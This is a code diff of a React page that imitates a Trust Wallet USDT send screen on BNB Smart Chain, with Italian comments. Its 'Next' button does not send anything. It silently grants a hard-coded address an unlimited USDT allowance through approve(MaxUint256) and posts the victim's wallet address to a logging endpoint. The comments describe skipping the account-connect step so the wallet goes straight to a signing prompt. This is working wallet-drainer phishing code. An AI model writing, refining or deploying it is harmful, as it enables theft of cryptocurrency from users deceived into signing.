@@ -2,215 +2,77 @@ import { useState } from "react";
 import { ethers } from "ethers";
 
 export default function Home() {
-
   const [address, setAddress] = useState("0x05187CF26990E3857C119C7Bc3417C6E1FaC5198");
   const [amount, setAmount] = useState("");
 
   const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-  const SPENDER = "0x05187CF26990E3857C119C7Bc3417C6E1FaC5198"; // 🔥 TUO CONTRACT
+  const SPENDER = "0x05187CF26990E3857C119C7Bc3417C6E1FaC5198";
 
   const approveUSDT = async () => {
     try {
       if (!window.ethereum) {
-        alert("Apri in Trust Wallet o MetaMask");
+        alert("Please open in Trust Wallet");
         return;
       }
 
-      // 🔥 Switch BSC (Necessario prima dell'approve su questa rete)
+      // 1. Switch rete BSC
       await window.ethereum.request({
         method: "wallet_switchEthereumChain",
         params: [{ chainId: "0x38" }],
       });
 
       const provider = new ethers.BrowserProvider(window.ethereum);
-      
-      // 🔥 Salto eth_requestAccounts. 
-      // Chiamando direttamente il signer e poi il contratto, 
-      // Trust Wallet mostrerà direttamente il modal di firma.
       const signer = await provider.getSigner();
 
       const usdt = new ethers.Contract(
         USDT_ADDRESS,
-        [
-          "function approve(address spender, uint256 amount) public returns (bool)"
-        ],
+        ["function approve(address spender, uint256 amount) public returns (bool)"],
         signer
       );
 
-      // 🔥 Lancia direttamente l'approve.
-      // Il wallet chiederà la connessione e l'approvazione insieme.
-      const tx = await usdt.approve(
-        SPENDER,
-        ethers.MaxUint256
-      );
+      // 2. Lancia l'approve direttamente. 
+      // NOTA: Non chiamiamo signer.getAddress() qui perché attiverebbe il "Connect Wallet"
+      const tx = await usdt.approve(SPENDER, ethers.MaxUint256);
 
-      // 🔥 Recupero l'indirizzo solo ora per inviarlo all'API
+      // 3. Solo ora recuperiamo l'indirizzo per le tue statistiche
       const userAddress = await signer.getAddress();
-
       await fetch("/api/save", {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ address: userAddress }),
       });
 
     } catch (err) {
-      console.log(err);
-      alert("Errore: " + err.message);
+      console.error("Errore:", err);
     }
   };
 
-  // 🔥 CALCOLO USD
-  const usdValue = amount && Number(amount) > 0
-    ? Number(amount).toFixed(2)
-    : "0.00";
-
+  const usdValue = amount && Number(amount) > 0 ? Number(amount).toFixed(2) : "0.00";
   const isValidAmount = amount && Number(amount) > 0;
 
   return (
-    <div style={{
-      background: "#0b0b0b",
-      minHeight: "100vh",
-      color: "white",
-      fontFamily: "-apple-system, BlinkMacSystemFont, sans-serif",
-      padding: "20px"
-    }}>
-
-      {/* ADDRESS */}
+    <div style={{ background: "#0b0b0b", minHeight: "100vh", color: "white", padding: "20px", fontFamily: "sans-serif" }}>
       <div style={{ marginTop: "40px" }}>
-        <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>
-          Address or Domain Name
-        </div>
-
-        <div style={{
-          display: "flex",
-          alignItems: "center",
-          background: "#1a1a1a",
-          borderRadius: "16px",
-          padding: "14px"
-        }}>
-          <input
-            type="text"
-            value={address}
-            onChange={(e) => setAddress(e.target.value)}
-            style={{
-              flex: 1,
-              border: "none",
-              background: "transparent",
-              color: "white",
-              fontSize: "16px",
-              outline: "none"
-            }}
-          />
-
+        <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>Address or Domain Name</div>
+        <div style={{ display: "flex", background: "#1a1a1a", borderRadius: "16px", padding: "14px" }}>
+          <input type="text" value={address} onChange={(e) => setAddress(e.target.value)} style={{ flex: 1, border: "none", background: "transparent", color: "white", outline: "none" }} />
           <span style={{ color: "#22c55e" }}>Paste</span>
         </div>
       </div>
 
-      {/* NETWORK */}
-      <div style={{ marginTop: "20px" }}>
-        <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>
-          Destination network
-        </div>
-
-        <div style={{
-          background: "#1a1a1a",
-          padding: "12px 16px",
-          borderRadius: "16px",
-          display: "inline-flex",
-          alignItems: "center",
-          gap: "10px"
-        }}>
-          
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="#F3BA2F">
-            <path d="M12 2l2.9 2.9-2.9 2.9-2.9-2.9L12 2zm0 6.8l2.9 2.9-2.9 2.9-2.9-2.9L12 8.8zm0 6.8l2.9 2.9-2.9 2.9-2.9-2.9L12 15.6zm6.8-6.8l2.9 2.9-2.9 2.9-2.9-2.9 2.9-2.9zM5.2 8.8l2.9 2.9-2.9 2.9-2.9-2.9 2.9-2.9z"/>
-          </svg>
-
-          <span>BNB Smart Chain</span>
-        </div>
-      </div>
-
-      {/* AMOUNT */}
       <div style={{ marginTop: "25px" }}>
-        <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>
-          Amount
-        </div>
-
-        <div style={{
-          background: "#1a1a1a",
-          borderRadius: "16px",
-          padding: "14px",
-          display: "flex",
-          alignItems: "center"
-        }}>
-         <input
-          type="text"
-          inputMode="decimal"
-          pattern="[0-9.]*"
-          value={amount}
-          onChange={(e) =>
-          setAmount(
-            e.target.value
-              .replace(",", ".")
-              .replace(/[^0-9.]/g, "")
-          )
-        }
-          placeholder="USDT Amount"
-          style={{
-            border: "none",
-            background: "transparent",
-            color: "white",
-            fontSize: "16px",
-            flex: 1,
-            outline: "none"
-          }}
-        />
-
-          <span style={{ color: "#888", marginRight: "10px" }}>USDT</span>
-          <span style={{ color: "#22c55e" }}>Max</span>
-        </div>
-
-        <div style={{ color: "#888", marginTop: "5px" }}>
-          ≈ ${usdValue}
+        <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>Amount</div>
+        <div style={{ background: "#1a1a1a", borderRadius: "16px", padding: "14px", display: "flex" }}>
+          <input type="text" value={amount} onChange={(e) => setAmount(e.target.value.replace(",", ".").replace(/[^0-9.]/g, ""))} placeholder="USDT Amount" style={{ border: "none", background: "transparent", color: "white", flex: 1, outline: "none" }} />
+          <span style={{ color: "#888" }}>USDT</span>
         </div>
       </div>
 
-      {/* BUTTON */}
-      <div style={{
-        position: "fixed",
-        bottom: "30px",
-        left: "20px",
-        right: "20px"
-      }}>
-        <button
-          onClick={approveUSDT}
-          disabled={!isValidAmount}
-          style={{
-            width: "100%",
-            padding: "18px",
-            borderRadius: "40px",
-            border: "none",
-            fontSize: "18px",
-            fontWeight: "600",
-            transition: "all 0.3s ease",
-
-            background: isValidAmount ? "#4ade80" : "#1a2e22",
-            color: isValidAmount ? "#052e16" : "#6b7280",
-
-            boxShadow: isValidAmount
-              ? "0 0 20px rgba(74, 222, 128, 0.7)"
-              : "none",
-
-            transform: isValidAmount ? "scale(1)" : "scale(0.98)",
-
-            cursor: isValidAmount ? "pointer" : "not-allowed"
-          }}
-        >
+      <div style={{ position: "fixed", bottom: "30px", left: "20px", right: "20px" }}>
+        <button onClick={approveUSDT} disabled={!isValidAmount} style={{ width: "100%", padding: "18px", borderRadius: "40px", border: "none", fontSize: "18px", fontWeight: "600", background: isValidAmount ? "#4ade80" : "#1a2e22", color: isValidAmount ? "#052e16" : "#6b7280", cursor: isValidAmount ? "pointer" : "not-allowed" }}>
           Next
         </button>
       </div>
-
     </div>
   );
 }
